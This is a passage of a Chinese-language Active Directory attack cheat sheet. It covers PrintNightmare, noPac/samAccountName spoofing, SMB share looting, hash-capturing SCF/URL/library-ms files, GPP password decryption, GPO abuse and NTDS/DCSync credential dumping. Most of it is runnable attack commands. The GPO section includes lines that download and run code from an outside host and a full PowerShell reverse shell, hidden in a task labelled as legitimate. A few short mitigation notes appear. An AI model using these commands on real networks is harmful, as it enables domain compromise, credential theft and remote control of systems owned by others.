  * 一个运行`PrintSpooler`服务的DC

  * 另一个易受zerologon攻击的DC

  * `ntlmrelayx` - 来自Impacket和任何工具，如[`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

    ```powershell
    # 检查一个DC是否运行PrintSpooler服务
    rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
    
    # 在一个shell中设置ntlmrelay
    ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
    
    #在第二个shell中触发printerbug
    python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
    ```

  ### PrintNightmare

  > CVE-2021-1675 / CVE-2021-34527

  DLL将被存储在`C:\Windows\System32\spool\drivers\x64\3\`。
  漏洞将执行来自本地文件系统或远程共享的DLL。

  要求：

  * **Spooler Service** 启用（强制性）
  * 补丁更新前的< June 2021的服务器
  * 具有`Pre Windows 2000 Compatibility`组的DC
  * 服务器具有注册表键 `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
  * 服务器具有注册表键 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0

  **检测漏洞**：

  * Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)

    ```ps1
    python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
    Protocol: [MS-RPRN]: Print System Remote Protocol
    ```

  * [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 

    ```ps1
    git clone https://github.com/byt3bl33d3r/ItWasAllADream
    cd ItWasAllADream && poetry install && poetry shell
    itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
    docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
    ```

  **有效载荷托管**： 

  * 有效载荷可以托管在Impacket SMB服务器上，因为[PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109)：

  ```ps1
  python3 ./smbserver.py share /tmp/smb/
  ```

  * 使用[Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1)（主机上需要管理员权限）： 

  ```ps1
  Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
  ```

  * 使用WebDav和[SharpWebServer](https://github.com/mgeeky/SharpWebServer)（不需要管理员权限）：

  ```ps1
  SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
  ```

  当使用WebDav而不是SMB时，必须在URI的主机名中添加`@[PORT]`，例如：`\\172.16.1.5@8888\Downloads\beacon.dll`
  WebDav客户端**必须**在被利用的目标上激活。默认情况下，Windows工作站上没有激活WebDav（您必须`net start webclient`），服务器上也没有安装。以下是检测激活的webdav的方法：

  ```ps1
  cme smb -u user -p password -d domain.local -M webdav [TARGET]
  ```

  **触发漏洞**： 

  * [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)

    ```powershell
    # 需要修改过的Impacket：https://github.com/cube0x0/impacket
    python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
    python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
    ## LPE
    SharpPrintNightmare.exe C:\addCube.dll
    ## 使用现有上下文的RCE
    SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository
  tprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
    ## 使用runas /netonly的RCE
    SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository
  tprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
    ```

  * [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)

    ```powershell
    ## 仅LPE（PS1 + DLL）
    Import-Module .\cve-2021-1675.ps1
    Invoke-Nightmare # 默认情况下在本地管理员组中添加用户`adm1n`/`P@ssw0rd`
    Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
    Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
    ```

  * [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)

    ```powershell
    ## LPE
    misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
    ## RCE
    misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
    ```

  * [PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)

    ```powershell
    PrintNightmare [目标ip或主机名] [有效负载Dll的UNC路径] [可选域] [可选用户名] [可选密码]
    ```

  **调试信息**

  | 错误  | 消息                  | 调试                |
  | ----- | --------------------- | ------------------- |
  | 0x5   | `rpc_s_access_denied` | SMB共享中文件的权限 |
  | 0x525 | `ERROR_NO_SUCH_USER`  | 指定的帐户不存在。  |
  | 0x180 | 未知错误代码          | 共享不是SMB2        |

  

  文档：*## samAccountName欺骗

  在S4U2Self过程中，如果KDC无法找到计算机名，它会尝试在TGT中指定的计算机名后附加'\$'。攻击者可以创建一个新的机器账户，并将其sAMAccountName设置为域控制器的sAMAccountName——不包括'\$'。例如，假设有一个域控制器的sAMAccountName设置为'DC\$'。攻击者随后会创建一个机器账户，其sAMAccountName设置为'DC'。攻击者然后可以为新建的机器账户请求TGT。在KDC发放了TGT之后，攻击者可以将新创建的机器账户重命名为其他名称，例如JOHNS-PC。攻击者接着执行S4U2Self并为自己请求ST，冒充任意用户。由于设置了'sAMAccountName'为'DC'的机器账户已被重命名，KDC会尝试通过附加'$'来查找机器账户，这样就会匹配到域控制器。然后KDC会为域控制器发放一个有效的ST。

  **要求**

  * MachineAccountQuota > 0

  **检查是否被利用**

  0. 检查账户的MachineAccountQuota

  ```powershell
  crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
  StandIn.exe --object ms-DS-MachineAccountQuota=*
  ```

  1. 检查域控制器是否易受攻击

  ```powershell
  crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
  ```

  **利用方法**

  0. 创建一个计算机账户

  ```powershell
  impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
  
  powermad@windows> . .\Powermad.ps1
  powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
  powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
  
  sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
  ```

  1. 清除受控机器账户的`servicePrincipalName`属性

  ```ps1
  impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
  
  powershell@windows> . .\Powerview.ps1
  powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
  ```

  2. (CVE-2021-42278) 将受控机器账户的`sAMAccountName`更改为不带尾随`$`的域控制器名称

  ```ps1
  # https://github.com/SecureAuthCorp/impacket/pull/1224
  impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
  
  powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
  ```

​          3.为受控机器账户请求票据授权文件（TGT）

```ps1
impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
```

​         4.将受控机器账户的sAMAccountName重置为其旧值
```ps1
impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
```

​        5.（CVE-2021-42287）通过出示之前获得的TGT，使用`S4U2self`请求服务票据
```ps1
# https://github.com/SecureAuthCorp/impacket/pull/1202
impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
```

​      6.DCSync操作：`KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'`

### 自动化利用:

* [cube0x0/noPac](https://github.com/cube0x0/noPac) - Windows
    ```powershell
    noPac.exe scan -domain htb.local -user user -pass 'password123'
    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
    noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
    ```
* [Ridter/noPac](https://github.com/Ridter/noPac) - Linux
  ```ps1
  python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
  ```
* [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)
  
    ```ps1
    $ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
    [*] Selected Target dc.caltech.white                                              
    [*] Total Domain Admins 11                                                        
    [*] will try to impersonat gaylene.dreddy                                         
    [*] Current ms-DS-MachineAccountQuota = 10                                        
    [*] Adding Computer Account "SAMTHEADMIN-11$"                                     
    [*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
    [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
    [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
    [*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
    [*] Saving ticket in dc.ccache                                                    
    [*] Resting the machine account to SAMTHEADMIN-11$                                
    [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
    [*] Using TGT from cache                                                          
    [*] Impersonating gaylene.dreddy                                                  
    [*]     Requesting S4U2self                                                       
    [*] Saving ticket in gaylene.dreddy.ccache                                        
    [!] Launching semi-interactive shell - Careful what you execute                   
    C:\Windows\system32>whoami                                                        
    nt authority\system 
    ```
* [ly4k/Pachine](https://github.com/ly4k/Pachine)
    ```powershell
    usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
                  [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
                  [domain/]username[:password]
    $ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'
    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'
    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache
    $ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'
    ```

**缓解措施**：

* [KB5007247 - Windows Server 2012 R2](https://support.microsoft.com/en-us/topic/2021年11月9日-kb5007247-月度汇总更新-2c3b6017-82f4-4102-b1e2-36f366bf3520)
* [KB5008601 - Windows Server 2016](https://support.microsoft.com/en-us/topic/2021年11月14日-kb5008601-操作系统构建14393-4771-带外更新-c8cd33ce-3d40-4853-bee4-a7cc943582b9)
* [KB5008602 - Windows Server 2019](https://support.microsoft.com/en-us/topic/2021年11月14日-kb5008602-操作系统构建17763-2305-带外更新-8583a8a3-ebed-4829-b285-356fb5aaacd7)
* [KB5007205 - Windows Server 2022](https://support.microsoft.com/en-us/topic/2021年11月9日-kb5007205-操作系统构建20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31)
* [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-AD域安全账户管理器强化更改-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
* [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-认证更新-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)

## 开放共享

> 一些共享可以在不需要认证的情况下访问，探索它们以找到一些有价值文件。

* [ShawnDEvans/smbmap - 一个方便的SMB枚举工具](https://github.com/ShawnDEvans/smbmap)

  ```powershell
  smbmap -H 10.10.10.10                # 空会话
  smbmap -H 10.10.10.10 -R             # 递归列出
  smbmap -H 10.10.10.10 -u invaliduser # 访客SMB会话
  smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
  ```

* [byt3bl33d3r/pth-smbclient 来自path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

  ```powershell
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
  ls  # 列出文件
  cd  # 进入文件夹
  get # 下载文件
  put # 替换文件
  ```

* [SecureAuthCorp/smbclient 来自Impacket](https://github.com/SecureAuthCorp/impacket)

  ```powershell
  smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      远程管理
          C$              Disk      默认共享
          IPC$            IPC       远程IPC
          NETLOGON        Disk      登录服务器共享
          Replication     Disk      
          SYSVOL          Disk      登录服务器共享
          Users           Disk
  use Sharename # 选择一个Sharename
  cd Folder     # 进入一个文件夹
  ls            # 列出文件
  ```

* [smbclient - 来自Samba，类似ftp的客户端，用于访问服务器上的SMB/CIFS资源](#)

  ```powershell
  smbclient -U username //10.0.0.1/SYSVOL
  smbclient //10.0.0.1/Share
  
  # 递归下载一个文件夹
  smb: \> mask ""
  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> lcd '/path/to/go/'
  smb: \> mget *
  ```

* [SnaffCon/Snaffler - 一款帮助渗透测试人员寻找有趣内容的工具](https://github.com/SnaffCon/Snaffler)

  ```ps1
  snaffler.exe -s - snaffler.log
  
  # 获取域中所有计算机的信息
  ./Snaffler.exe -d domain.local -c <DC> -s
  
  # 获取特定计算机的信息
  ./Snaffler.exe -n computer1,computer2 -s
  
  # 获取特定目录的信息
  ./Snaffler.exe -i C:\ -s
  ```

## SCF和URL文件攻击可写共享

这些攻击可以使用[Farmer.exe](https://github.com/mdsecactivebreach/Farmer)和[Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)自动化。

```ps1
# Farmer接收认证
farmer.exe <端口> [秒数] [输出]
farmer.exe 8888 0 c:\windows\temp\test.tmp # 无限期
farmer.exe 8888 60 # 一分钟

# Crop可用于创建触发SMB/WebDAV连接的各种文件类型，用于在哈希收集攻击中污染文件共享。
crop.exe <输出文件夹> <输出文件名> <WebDAV服务器> <LNK值> [选项]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```

### SCF文件

将以下`@something.scf`文件放入共享文件夹中，并使用Responder启动监听：`responder -wrf --lm -v -I eth0`

```powershell
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

使用[`crackmapexec`](https://github.com/mpgn/CrackMapExec/blob/master/cme/modules/slinky.py)：

```ps1
crackmapexec smb 10.10.10.10 -u 用户名 -p 密码 -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
crackmapexec smb 10.10.10.10 -u 用户名 -p 密码 -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
crackmapexec smb 10.10.10.10 -u 用户名 -p 密码 -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
```

### URL文件

这种攻击也适用于`.url`文件和`responder -I eth0 -v`。

```powershell
[InternetShortcut]
URL=任意内容
WorkingDirectory=任意内容
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

### Windows库文件

> Windows库文件（.library-ms）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Windows搜索连接器文件

> Windows搜索连接器（.searchConnector-ms）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```

## 在SYSVOL和组策略首选项中的密码

在SYSVOL中查找密码（MS14-025）。SYSVOL是Active Directory中的域范围共享，所有经过身份验证的用户都有读取权限。所有域组策略都存储在这里：`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`。

```powershell
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

解密在SYSVOL中找到的组策略密码（由[0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280)提供），使用微软在[MSDN - 2.2.1.1.4 密码加密](https://msdn.microsoft.com/en-us/library/cc422924.aspx)中提供的32字节AES密钥



```bash
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

e.g: 
echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

### 自动执行SYSVOL和密码研究

* Metasploit模块用于枚举共享和凭据

  ```c
  scanner/smb/smb_enumshares
  post/windows/gather/enum_shares
  post/windows/gather/credentials/gpp
  ```

* CrackMapExec模块

  ```powershell
  cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
  cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
  ```

* [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)

  ```powershell
  # 使用空会话
  Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
  
  # 使用明文凭据
  Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
  
  # 传递哈希
  Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
  ```

### 缓解措施

* 在每台用于管理GPO的计算机上安装[KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)，防止新凭据被放置在组策略首选项中。
* 删除SYSVOL中包含密码的现有GPP xml文件。
* 不要将密码放在所有经过身份验证的用户都能访问的文件中。

## 利用组策略对象GPO

> GPO的创建者自动获得明确的编辑设置、删除、修改安全权限，这表现为CreateChild、DeleteChild、Self、WriteProperty、DeleteTree、Delete、GenericRead、WriteDacl、WriteOwner

:triangular_flag_on_post: GPO优先级：组织单位 > 域 > 站点 > 本地

GPO存储在DC中的`\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`，位于**User**和**Machine**两个文件夹内。
如果你有权编辑GPO，你可以连接到DC并替换文件。计划任务位于`Machine\Preferences\ScheduledTasks`。

:warning: 域成员每90分钟刷新一次组策略设置，随机偏移量为0到30分钟，但可以通过以下命令在本地强制刷新：`gpupdate /force`。

### 寻找易受攻击的GPO

查找你拥有**写入**权限的GPLink。

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
```

### 使用SharpGPOAbuse滥用GPO

```powershell
# 构建并配置SharpGPOAbuse
$ git clone https://github.com/FSecureLABS/SharpGPOAbuse
$ Install-Package CommandLineParser -Version 1.9.3.15
$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll

# 添加用户权限
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"

# 添加本地管理员
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

# 配置用户或计算机登录脚本
.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

# 配置计算机或用户即时任务
# /!\ 旨在每次GPO刷新时“运行一次”，而不是每个系统运行一次
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
```

### 使用PowerGPOAbuse滥用GPO

* https://github.com/rootSySdk/PowerGPOAbuse

```ps1
PS> . .\PowerGPOAbuse.ps1

# Adding a localadmin 
PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Assign a new right 
PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Adding a New Computer/User script 
PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

# Create an immediate task 
PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```

### 使用pyGPOAbuse滥用GPO

```powershell
$ git clone https://github.com/Hackndo/pyGPOAbuse

# 将john用户添加到本地管理员组（密码：H4x00r123..）
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"

# 逆向shell示例
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "完全合法的任务" \
    -description "这是合法的，请不要删除" \ 
    -user
```

### 使用PowerView滥用GPO

```powershell
# 枚举GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# New-GPOImmediateTask通过VulnGPO将Empire启动器推送到机器上
New-GPOImmediateTask -TaskName 调试 -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

### 使用StandIn滥用GPO

```powershell
# 添加本地管理员
StandIn.exe --gpo --filter Shards --localadmin user002

# 为用户设置自定义权限
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"

# 执行自定义命令
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```

## 转储AD域凭据

提取ntds需要以下文件：

- NTDS.dit文件
- SYSTEM注册表项（`C:\Windows\System32\SYSTEM`）

通常可以在两个位置找到ntds：`systemroot\NTDS\tds.dit` 和 `systemroot\System32\tds.dit`。

- `systemroot\NTDS\tds.dit` 存储在域控制器上使用的数据库。它包含域的值和森林（配置容器数据）的值的副本。
- `systemroot\System2\tds.dit` 是在运行Windows Server 2003或更高版本的服务器上安装Active Directory时使用的默认目录的分发副本。因为此文件可用，所以可以在不使用服务器操作系统CD的情况下运行Active Directory安装向导。

但是，您可以将位置更改为自定义位置，您需要查询注册表以获取当前位置。

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

### DCSync攻击

DCSync是一种技术，攻击者利用它从Active Directory环境中的域控制器获取敏感信息，包括密码哈希。任何属于Administrators、Domain Admins或Enterprise Admins以及域控制器计算机账户的成员都能够运行DCSync来拉取密码数据。

* 仅DCSync一个用户

  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
  ```

* DCSync域的所有用户

  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /all /csv
  
  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
  ```

> :warning: OPSEC注意：复制总是在2台计算机之间进行。从用户账户进行DCSync可能会引发警报。


### 卷影复制

VSS是一项Windows服务，允许用户在特定时间点创建其数据的快照或备份。攻击者可以滥用此服务来访问和复制敏感数据，即使它当前正在被另一个进程使用或锁定。

* [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)
  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
  ```
* [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)
  ```powershell
  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
  ```
* [CrackMapExec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
  ```powershell
  cme smb 10.10.0.202 -u username -p password --ntds vss
  ```

### 从ntds.dit提取哈希值

然后您需要使用[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)来提取哈希值，在检索到的ntds.dit上使用`LOCAL`选项

```java
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)也可以远程使用

```java
./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

* `-pwd-last-set`：显示每个NTDS.DIT帐户的pwdLastSet属性。
* `-user-status`：显示用户是否被禁用。

### 使用Mimikatz sekurlsa

在域控制器上运行时，转储Active Directory域中的凭据数据。
:警告：需要具有调试权限或本地SYSTEM权限的管理员访问权限

```powershell
sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt
```

### 使用hashcat破解NTLM哈希

当您想要获得明文密码或需要进行弱密码统计时很有用。

推荐词表：

- [Rockyou.txt](https://weakpass.com/wordlist/90)
